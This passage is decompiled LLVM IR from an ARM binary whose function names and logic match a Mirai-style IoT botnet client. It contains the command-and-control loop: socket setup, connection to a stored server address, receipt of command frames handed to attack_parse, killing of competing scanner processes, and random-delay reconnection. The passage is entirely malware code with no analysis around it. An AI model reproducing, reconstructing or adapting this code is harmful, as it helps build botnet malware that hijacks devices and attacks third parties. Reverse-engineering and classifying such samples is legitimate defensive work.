  %v2_c7fc = load i32, i32* @global_var_20dc0.89, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_c808 = call i32 @__libc_recv(i32 %v2_c7fc, i32 %v2_c8bc, i32 2, i32 16386)
  %v7_c80c = icmp eq i32 %v4_c808, -1
  br i1 %v7_c80c, label %dec_label_pc_c9e8, label %dec_label_pc_c814

dec_label_pc_c814:                                ; preds = %dec_label_pc_c7e0
  %v2_c814 = icmp eq i32 %v4_c808, 0
  br i1 %v2_c814, label %dec_label_pc_c9f8, label %dec_label_pc_c81c

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c814
  store i32 %v2_c6d8, i32* %ip.global-to-local, align 4
  %v3_c820 = load i8*, i8** %stack_var_-42, align 4
  %v4_c820 = ptrtoint i8* %v3_c820 to i32
  store i32 %v4_c820, i32* %r3.global-to-local, align 4
  %v2_c824 = icmp eq i8* %v3_c820, null
  br i1 %v2_c824, label %dec_label_pc_c82c, label %dec_label_pc_ca28

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c81c
  %v2_c82c = load i32, i32* @global_var_20dc0.89, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_c838 = add i32 %v4_c820, 16384
  store i32 %v1_c838, i32* %r3.global-to-local, align 4
  %v4_c83c = call i32 @__libc_recv(i32 %v2_c82c, i32 %v2_c8bc, i32 2, i32 %v1_c838)
  br label %dec_label_pc_c5ac

dec_label_pc_c844:                                ; preds = %dec_label_pc_c61c
  %v0_c84c = load i32, i32* @r4, align 4
  store i32 %v0_c84c, i32* %r2.global-to-local, align 4
  %v3_c850 = call i32 @socket(i32 2, i32 1, i32 %v0_c84c)
  %v7_c854 = icmp eq i32 %v3_c850, -1
  store i32 %v3_c850, i32* @r5, align 4
  %v1_c85c = load i32, i32* @r8, align 4
  %v2_c85c = inttoptr i32 %v1_c85c to i32*
  store i32 %v3_c850, i32* %v2_c85c, align 4
  br i1 %v7_c854, label %dec_label_pc_c62c, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c844
  %v0_c864 = load i32, i32* @r4, align 4
  store i32 %v0_c864, i32* @r2, align 4
  %v2_c86c = call i32 @__libc_fcntl(i32 %v3_c850, i32 3)
  %v1_c874 = or i32 %v2_c86c, 2048
  store i32 %v1_c874, i32* @r2, align 4
  %v0_c878 = load i32, i32* @r5, align 4
  %v2_c87c = call i32 @__libc_fcntl(i32 %v0_c878, i32 4)
  %v2_c884 = load i32, i32* @global_var_20dc4.68, align 4
  store i32 %v2_c884, i32* %r3.global-to-local, align 4
  %v2_c888 = icmp eq i32 %v2_c884, 0
  br i1 %v2_c888, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_c864
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_c864, %bb42
  %v2_c890 = xor i1 %v2_c888, true
  call void @__pseudo_cond_branch(i1 %v2_c890, i32 ptrtoint (i32* @global_var_fa44.95 to i32))
  store i32 ptrtoint (i8** @global_var_20f3c.92 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_c89c = load i32, i32* @global_var_20dc0.89, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_20f3c.92 to i8*), align 4
  %v4_c8ac = call i32 @__libc_connect(i32 %v2_c89c, i32 ptrtoint (i16** @global_var_23a50.70 to i32), i32 16)
  br label %dec_label_pc_c62c

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c6b4
  %v2_c8b8 = load i32, i32* @global_var_20dc0.89, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_c8c8 = call i32 @__libc_send(i32 %v2_c8b8, i32 %v2_c8bc, i32 2, i32 16384)
  br label %dec_label_pc_c6e8

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c72c
  store i32 4, i32* @r4, align 4
  store i32 %v2_c8d8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_c8b4, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_c8f4 = call i32 @getsockopt(i32 %v2_c7ac, i32 1, i32 4, i32 %v2_c8d8, i32 %v2_c8b4)
  %v3_c8f8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_c8f8, i32* %r3.global-to-local, align 4
  %v2_c8fc = icmp eq i32 %v3_c8f8, 0
  br i1 %v2_c8fc, label %dec_label_pc_c984, label %dec_label_pc_c904

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8d0
  %v2_c904 = load i32, i32* @global_var_20dc0.89, align 4
  %v1_c908 = call i32 @__GI___libc_close(i32 %v2_c904)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_c910 = load i32, i32* @r5, align 4
  %v2_c910 = inttoptr i32 %v1_c910 to i32*
  store i32 -1, i32* %v2_c910, align 4
  %v0_c914 = call i32 @rand_next()
  %v3_c91c = zext i32 %v0_c914 to i64
  %v4_c91c = mul nuw i64 %v3_c91c, 3435973837
  %v7_c91c = trunc i64 %v4_c91c to i32
  store i32 %v7_c91c, i32* %ip.global-to-local, align 4
  %v3_c9202 = udiv i64 %v4_c91c, 34359738368
  %v3_c9244 = mul nuw nsw i64 %v3_c9202, 8
  %v3_c924 = trunc i64 %v3_c9244 to i32
  store i32 %v3_c924, i32* %r2.global-to-local, align 4
  %v2_c9286 = mul nuw nsw i64 %v3_c9202, 2
  %v2_c928 = trunc i64 %v2_c9286 to i32
  %v2_c92c = add i32 %v3_c924, %v2_c928
  store i32 %v2_c92c, i32* %r3.global-to-local, align 4
  %v2_c930 = sub i32 %v0_c914, %v2_c92c
  %v1_c934 = add i32 %v2_c930, 1
  %v1_c938 = call i32 @sleep(i32 %v1_c934)
  br label %dec_label_pc_c5ac

dec_label_pc_c940:                                ; preds = %dec_label_pc_c6f8
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_c8d8, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_c954 = call i32 @__libc_accept(i32 %v2_c6ec, i32 %v2_c94c, i32 %v2_c8d8, i32 16, i32 16)
  %v1_c958 = call i32 @scanner_kill(i32 %v5_c954)
  %v2_c968 = call i32 @kill(i32 %v1_c964, i32 9)
  store i32 ptrtoint (i32* @global_var_20f38.80 to i32), i32* %r3.global-to-local, align 4
  %v2_c970 = load i32, i32* @global_var_20f38.80, align 4
  %v2_c974 = icmp eq i32 %v2_c970, 0
  br i1 %v2_c974, label %dec_label_pc_c97c, label %dec_label_pc_ca1c

dec_label_pc_c97c:                                ; preds = %dec_label_pc_c940, %dec_label_pc_ca1c
  %v1_c980 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c984

dec_label_pc_c984:                                ; preds = %dec_label_pc_c8d0, %dec_label_pc_c97c
  %v2_c988 = call i32 @util_strlen(i8* %v1_c988)
  %sext = mul i32 %v2_c988, 16777216
  %v1_c98c = sdiv i32 %sext, 16777216
  %v7_c98c = inttoptr i32 %v1_c98c to i8*
  store i8* %v7_c98c, i8** %stack_var_-42, align 4
  %v0_c990 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* @lr, align 4
  %v0_c998 = load i32, i32* @r4, align 4
  store i32 %v0_c998, i32* %r2.global-to-local, align 4
  store i32 %v0_c990, i32* @global_var_23a4c.55, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c9a8 = load i32, i32* @r5, align 4
  %v1_c9a8 = inttoptr i32 %v0_c9a8 to i32*
  %v2_c9a8 = load i32, i32* %v1_c9a8, align 4
  %v4_c9ac = call i32 @__libc_send(i32 %v2_c9a8, i32 ptrtoint (i32* @global_var_18118.99 to i32), i32 %v0_c998, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_c9b8 = load i32, i32* @r5, align 4
  %v1_c9b8 = inttoptr i32 %v0_c9b8 to i32*
  %v2_c9b8 = load i32, i32* %v1_c9b8, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_c9c4 = call i32 @__libc_send(i32 %v2_c9b8, i32 %v2_c8bc, i32 1, i32 16384)
  %v3_c9c8 = load i8*, i8** %stack_var_-42, align 4
  %v4_c9c8 = ptrtoint i8* %v3_c9c8 to i32
  store i32 %v4_c9c8, i32* %r2.global-to-local, align 4
  %v3_c9cc = icmp eq i8* %v3_c9c8, null
  br i1 %v3_c9cc, label %dec_label_pc_c5ac, label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c984
  %v0_c9d4 = load i32, i32* @r5, align 4
  %v1_c9d4 = inttoptr i32 %v0_c9d4 to i32*
  %v2_c9d4 = load i32, i32* %v1_c9d4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_c9e0 = call i32 @__libc_send(i32 %v2_c9d4, i32 %v2_c3f0, i32 %v4_c9c8, i32 16384)
  br label %dec_label_pc_c5ac

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_ca58, %dec_label_pc_c7e0
  %v0_c9e8 = load i32, i32* @r5, align 4
  %v1_c9e8 = inttoptr i32 %v0_c9e8 to i32*
  %v2_c9e8 = load i32, i32* %v1_c9e8, align 4
  store i32 %v2_c9e8, i32* %r3.global-to-local, align 4
  %v7_c9ec = icmp eq i32 %v2_c9e8, 4
  br i1 %v7_c9ec, label %dec_label_pc_c5ac, label %bb44

bb44:                                             ; preds = %dec_label_pc_c9e8
  %v8_c9f0 = icmp eq i32 %v2_c9e8, 11
  br i1 %v8_c9f0, label %dec_label_pc_c5ac, label %dec_label_pc_c9f8

dec_label_pc_c9f8:                                ; preds = %dec_label_pc_ca7c, %bb44, %dec_label_pc_c814
  %v2_c9f8 = load i32, i32* @global_var_20dc0.89, align 4
  store i32 51716, i32* @lr, align 4
  %v1_ca00 = icmp ne i32 %v2_c9f8, -1
  call void @__pseudo_cond_branch(i1 %v1_ca00, i32 ptrtoint (i32* @global_var_12da0.94 to i32))
  store i32 ptrtoint (i32* @global_var_20dc0.89 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_20dc0.89, align 4
  %v1_ca14 = call i32 @sleep(i32 1)
  br label %dec_label_pc_c5ac

dec_label_pc_ca1c:                                ; preds = %dec_label_pc_c940
  %v2_ca20 = call i32 @kill(i32 %v2_c970, i32 9)
  br label %dec_label_pc_c97c

dec_label_pc_ca28:                                ; preds = %dec_label_pc_c81c
  %v3_ca28 = udiv i32 %v4_c820, 256
  %v1_ca2c = urem i32 %v4_c820, 256
  store i32 %v1_ca2c, i32* %r3.global-to-local, align 4
  %v4_ca30 = mul nuw nsw i32 %v1_ca2c, 256
  %v5_ca30 = or i32 %v4_ca30, %v3_ca28
  %v6_ca30 = trunc i32 %v5_ca30 to i16
  store i32 %v5_ca30, i32* %r2.global-to-local, align 4
  store i32 %v2_c6d8, i32* @lr, align 4
  %v7_ca3c = inttoptr i32 %v5_ca30 to i8*
  store i8* %v7_ca3c, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_ca30, 1025
  br i1 %tmp45, label %dec_label_pc_ca58, label %dec_label_pc_ca44

dec_label_pc_ca44:                                ; preds = %dec_label_pc_ca28
  %v2_ca44 = load i32, i32* @global_var_20dc0.89, align 4
  %v1_ca48 = call i32 @__GI___libc_close(i32 %v2_ca44)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ca50 = load i32, i32* @r8, align 4
  %v2_ca50 = inttoptr i32 %v1_ca50 to i32*
  store i32 -1, i32* %v2_ca50, align 4
  br label %dec_label_pc_c5ac

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca28
  %v0_ca58 = load i32, i32* @r4, align 4
  %v1_ca58 = load i32, i32* @r5, align 4
  %v2_ca58 = inttoptr i32 %v1_ca58 to i32*
  store i32 %v0_ca58, i32* %v2_ca58, align 4
  store i32 %v2_ca60, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_ca68 = load i32, i32* @global_var_20dc0.89, align 4
  %v7_ca70 = call i32 @__libc_recv(i32 %v2_ca68, i32 %v2_ca60, i32 %v5_ca30, i32 16386)
  %v7_ca74 = icmp eq i32 %v7_ca70, -1
  br i1 %v7_ca74, label %dec_label_pc_c9e8, label %dec_label_pc_ca7c

dec_label_pc_ca7c:                                ; preds = %dec_label_pc_ca58
  %v2_ca7c = icmp eq i32 %v7_ca70, 0
  br i1 %v2_ca7c, label %dec_label_pc_c9f8, label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca7c
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_ca90 = load i32, i32* @global_var_20dc0.89, align 4
  %v4_ca94 = call i32 @__libc_recv(i32 %v2_ca90, i32 %v2_c8bc, i32 2, i32 16384)
  %v3_ca9c = load i8*, i8** %stack_var_-42, align 4
  %v4_ca9c = ptrtoint i8* %v3_ca9c to i32
  %v3_caa0 = udiv i32 %v4_ca9c, 256
  %v1_caa4 = mul i32 %v4_ca9c, 256
  %v4_caa8 = and i32 %v1_caa4, 65280
  %v5_caa8 = or i32 %v4_caa8, %v3_caa0
  store i32 %v5_caa8, i32* %ip.global-to-local, align 4
  store i32 %v2_c6d8, i32* @lr, align 4
  store i32 %v5_caa8, i32* %r2.global-to-local, align 4
  %v2_cab8 = load i32, i32* @global_var_20dc0.89, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_cac0 = inttoptr i32 %v5_caa8 to i8*
  store i8* %v6_cac0, i8** %stack_var_-42, align 4
  %v6_cac4 = call i32 @__libc_recv(i32 %v2_cab8, i32 %v2_ca60, i32 %v5_caa8, i32 16384)
  store i32 %v2_c6d8, i32* %r2.global-to-local, align 4
  %v3_cacc = load i8*, i8** %stack_var_-42, align 4
  %v3_cad0 = icmp eq i8* %v3_cacc, null
  br i1 %v3_cad0, label %dec_label_pc_c5ac, label %dec_label_pc_cad8

dec_label_pc_cad8:                                ; preds = %dec_label_pc_ca84
  %v4_cacc = ptrtoint i8* %v3_cacc to i32
  %v5_cadc = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_cacc, i32 %v2_c6d8)
  br label %dec_label_pc_c5ac

; uselistorder directives
  uselistorder i8* %v3_cacc, { 1, 0 }
  uselistorder i32 %v5_caa8, { 1, 0, 2, 3 }
  uselistorder i32 %v7_ca70, { 1, 0 }
  uselistorder i32 %v5_ca30, { 1, 0, 3, 2 }
  uselistorder i32 %v3_c850, { 3, 2, 1, 0 }
  uselistorder i32 %v4_c820, { 1, 0, 2, 3 }
  uselistorder i32 %v4_c808, { 1, 0 }
  uselistorder i32 %v2_c7ac, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_c6ec, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_c6d4, { 1, 0, 2 }
  uselistorder i32 %v5_c6a0, { 1, 2, 0 }
  uselistorder i32 %v2_c5ec, { 2, 1, 0 }
  uselistorder i32 %v1_c5dc, { 1, 2, 0 }
  uselistorder i32 %v1_c5c0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_c8d8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c8bc, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_c8b4, { 1, 0 }
  uselistorder i32 %v2_c6d8, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_c5a8, { 1, 0, 2 }
  uselistorder i32 %v2_c454, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_c440, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_c3b0, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_20f38.80, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @sleep, { 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_20f3c.92 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_20f3c.92 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_20dbc.75, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_20dc0.89, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alphastr, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_20dc4.68, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_c0c4.66 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_c984, { 1, 0 }
  uselistorder label %dec_label_pc_c97c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_c6e8, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_c62c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c61c, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_c414, { 2, 0, 1 }
}

define i32 @function_cb08(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cb08:
  %v0_cb08 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_cb08, i32 -22317636)
  %v0_cb10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_cb10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_cb08
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_cb08, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_cb24 = load i32, i32* @global_var_20f40.101, align 4
  %v2_cb28 = load i32, i32* @global_var_20f4c.103, align 4
  %v4_cb34 = mul i32 %v2_cb24, 2048
  %v5_cb34 = xor i32 %v4_cb34, %v2_cb24
  %v4_cb38 = udiv i32 %v2_cb28, 524288
  %v5_cb38 = xor i32 %v4_cb38, %v2_cb28
  %v2_cb3c = load i32, i32* @global_var_20f44.105, align 4
  %v2_cb40 = load i32, i32* @global_var_20f48.107, align 4
  %v2_cb44 = xor i32 %v5_cb38, %v5_cb34
  %v4_cb48 = udiv i32 %v5_cb34, 256
  %v5_cb48 = xor i32 %v2_cb44, %v4_cb48
  store i32 %v2_cb3c, i32* @global_var_20f40.101, align 4
  store i32 %v2_cb40, i32* @global_var_20f44.105, align 4
  store i32 %v2_cb28, i32* @global_var_20f48.107, align 4
  store i32 %v5_cb48, i32* @global_var_20f4c.103, align 4
  ret i32 %v5_cb48

; uselistorder directives
  uselistorder i32 %v2_cb28, { 2, 1, 0 }
  uselistorder i32 %v2_cb24, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_cb80 = call i32 @__GI_time(i32* null)
  store i32 %v2_cb80, i32* @global_var_20f40.101, align 4
  %v1_cb8c = call i32 @__getpid(i32 %v2_cb80)
  store i32 %v1_cb8c, i32* @r0, align 4
  %v0_cb94 = call i32 @getppid()
  %v2_cb9c = xor i32 %v1_cb8c, %v0_cb94
  store i32 %v2_cb9c, i32* @global_var_20f44.105, align 4
  %v1_cba4 = call i32 @clock(i32 %v2_cb9c)
  %v2_cba8 = load i32, i32* @global_var_20f44.105, align 4
  %v2_cbb4 = xor i32 %v2_cba8, %v1_cba4
  store i32 %v2_cbb4, i32* @global_var_20f4c.103, align 4
  store i32 %v1_cba4, i32* @global_var_20f48.107, align 4
  ret i32 %v1_cba4

; uselistorder directives
  uselistorder i32 %v1_cba4, { 1, 2, 0 }
}

define i32 @rand_alphastr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_cbdc = load i32, i32* @r4, align 4
  %v6_cbdc = load i32, i32* @r5, align 4
  %v9_cbdc = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_cbf0 = call i32 @table_unlock_val(i32 37)
  %v3_cbfc = call i32 @table_retrieve_val(i32 37, i32* null)
  store i32 %v3_cbfc, i32* @r1, align 4
  %v2_cc08 = bitcast i32* %stack_var_-72 to i8*
  %v3_cc08 = call i32 @strcpy(i8* %v2_cc08, i32 %v3_cbfc)
  %v2_cc0c = icmp eq i32 %arg2, 0
  br i1 %v2_cc0c, label %dec_label_pc_cc88, label %dec_label_pc_cc14

dec_label_pc_cc14:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_20f40.101 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f44.105 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f48.107 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f4c.103 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_cc6c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cc28

dec_label_pc_cc28:                                ; preds = %dec_label_pc_cc28.dec_label_pc_cc28_crit_edge, %dec_label_pc_cc14
  %v1_cc4c = phi i32 [ %v1_cc4c.pre, %dec_label_pc_cc28.dec_label_pc_cc28_crit_edge ], [ ptrtoint (i32* @global_var_20f40.101 to i32), %dec_label_pc_cc14 ]
  %v2_cc28 = load i32, i32* @global_var_20f4c.103, align 4
  store i32 %v2_cc28, i32* %r2.global-to-local, align 4
  %v2_cc2c = load i32, i32* @global_var_20f40.101, align 4
  %v4_cc30 = udiv i32 %v2_cc28, 524288
  %v5_cc30 = xor i32 %v4_cc30, %v2_cc28
  %v4_cc34 = mul i32 %v2_cc2c, 2048
  %v5_cc34 = xor i32 %v4_cc34, %v2_cc2c
  %v2_cc38 = xor i32 %v5_cc30, %v5_cc34
  %v2_cc3c = load i32, i32* @global_var_20f44.105, align 4
  %v2_cc40 = load i32, i32* @global_var_20f48.107, align 4
  store i32 %v2_cc40, i32* %ip.global-to-local, align 4
  %v4_cc44 = udiv i32 %v5_cc34, 256
  %v5_cc44 = xor i32 %v2_cc38, %v4_cc44
  store i32 %v5_cc44, i32* @r4, align 4
  %v2_cc4c = inttoptr i32 %v1_cc4c to i32*
  store i32 %v2_cc3c, i32* %v2_cc4c, align 4
  %v0_cc50 = load i32, i32* %ip.global-to-local, align 4
  %v1_cc50 = load i32, i32* %r8.global-to-local, align 4
  %v2_cc50 = inttoptr i32 %v1_cc50 to i32*
  store i32 %v0_cc50, i32* %v2_cc50, align 4
  %v0_cc54 = load i32, i32* %r2.global-to-local, align 4
  %v1_cc54 = load i32, i32* %r7.global-to-local, align 4
  %v2_cc54 = inttoptr i32 %v1_cc54 to i32*
  store i32 %v0_cc54, i32* %v2_cc54, align 4
  %v0_cc58 = load i32, i32* @r4, align 4
  %v1_cc58 = load i32, i32* @r6, align 4
  %v2_cc58 = inttoptr i32 %v1_cc58 to i32*
  store i32 %v0_cc58, i32* %v2_cc58, align 4
  %v2_cc5c = call i32 @util_strlen(i8* %v2_cc08)
  %v0_cc64 = load i32, i32* @r4, align 4
  %v3_cc68 = urem i32 %v0_cc64, %v2_cc5c
  %v2_cc70 = add i32 %v3_cc68, %v2_cc6c
  %v1_cc74 = add i32 %v2_cc70, -32
  %v2_cc74 = inttoptr i32 %v1_cc74 to i8*
  %v3_cc74 = load i8, i8* %v2_cc74, align 1
  %v2_cc78 = load i32, i32* @r5, align 4
  %v3_cc78 = load i32, i32* %fp.global-to-local, align 4
  %v4_cc78 = add i32 %v3_cc78, %v2_cc78
  %v5_cc78 = inttoptr i32 %v4_cc78 to i8*
  store i8 %v3_cc74, i8* %v5_cc78, align 1
  %v0_cc7c = load i32, i32* @r5, align 4
  %v1_cc7c = add i32 %v0_cc7c, 1
  store i32 %v1_cc7c, i32* @r5, align 4
  %v1_cc80 = load i32, i32* %sb.global-to-local, align 4
  %v9_cc80 = icmp eq i32 %v1_cc7c, %v1_cc80
  br i1 %v9_cc80, label %dec_label_pc_cc88, label %dec_label_pc_cc28.dec_label_pc_cc28_crit_edge

dec_label_pc_cc28.dec_label_pc_cc28_crit_edge:    ; preds = %dec_label_pc_cc28
  %v1_cc4c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_cc28

dec_label_pc_cc88:                                ; preds = %dec_label_pc_cc28, %entry
  %v1_cc8c = call i32 @table_lock_val(i32 37)
  store i32 %v3_cbdc, i32* @r4, align 4
  store i32 %v6_cbdc, i32* @r5, align 4
  store i32 %v9_cbdc, i32* @r6, align 4
  ret i32 %v1_cc8c

; uselistorder directives
  uselistorder i32 %v2_cc2c, { 1, 0 }
  uselistorder i32 %v2_cc28, { 1, 0, 2 }
  uselistorder i32* @global_var_20f4c.103, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_20f48.107, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_20f44.105, { 2, 5, 3, 1, 0, 4 }
  uselistorder i32* @global_var_20f40.101, { 2, 4, 1, 0, 3 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_ccb8 = load i32, i32* @global_var_23a68.117, align 4
  %v2_ccc0 = call i32 @kill(i32 %v2_ccb8, i32 9)
  ret i32 %v2_ccc0

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ccd4 = load i32, i32* @r4, align 4
  store i32 %v3_ccd4, i32* %stack_var_-16, align 4
  %v6_ccd4 = load i32, i32* @r5, align 4
  %v9_ccd4 = load i32, i32* @r6, align 4
  %v12_ccd4 = load i32, i32* @lr, align 4
  %v0_ccd8 = load i32, i32* @r0, align 4
  store i32 %v0_ccd8, i32* @r5, align 4
  %v1_ccdc = add i32 %v0_ccd8, 4
  %v2_ccdc = inttoptr i32 %v1_ccdc to i32*
  %v3_ccdc = load i32, i32* %v2_ccdc, align 4
  store i32 %v3_ccdc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 52480, i32* @lr, align 4
  %v1_ccfc = icmp ne i32 %v3_ccdc, -1
  call void @__pseudo_cond_branch(i1 %v1_ccfc, i32 ptrtoint (i32* @global_var_12da0.94 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_cd08 = load i32, i32* @r6, align 4
  store i32 %v0_cd08, i32* %r2.global-to-local, align 4
  %v3_cd0c = call i32 @socket(i32 2, i32 1, i32 %v0_cd08)
  store i32 %v3_cd0c, i32* %r0.global-to-local, align 4
  %v7_cd10 = icmp eq i32 %v3_cd0c, -1
  %v1_cd14 = load i32, i32* @r5, align 4
  %v2_cd14 = add i32 %v1_cd14, 4
  %v3_cd14 = inttoptr i32 %v2_cd14 to i32*
  store i32 %v3_cd0c, i32* %v3_cd14, align 4
  br i1 %v7_cd10, label %entry.dec_label_pc_cd8c_crit_edge, label %dec_label_pc_cd1c

entry.dec_label_pc_cd8c_crit_edge:                ; preds = %entry
  %v1_cd94.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd8c

dec_label_pc_cd1c:                                ; preds = %entry
  %v2_cce0 = ptrtoint i32* %stack_var_-32 to i32
  %v0_cd1c = load i32, i32* @r5, align 4
  %v1_cd1c = add i32 %v0_cd1c, 28
  store i32 %v1_cd1c, i32* %r0.global-to-local, align 4
  %v0_cd20 = load i32, i32* @r6, align 4
  %v2_cd20 = add i32 %v0_cd1c, 24
  %v3_cd20 = inttoptr i32 %v2_cd20 to i32*
  store i32 %v0_cd20, i32* %v3_cd20, align 4
  %v2_cd28 = call i32 @util_zero(i32 %v1_cd1c, i32 256)
  store i32 %v2_cd28, i32* %r0.global-to-local, align 4
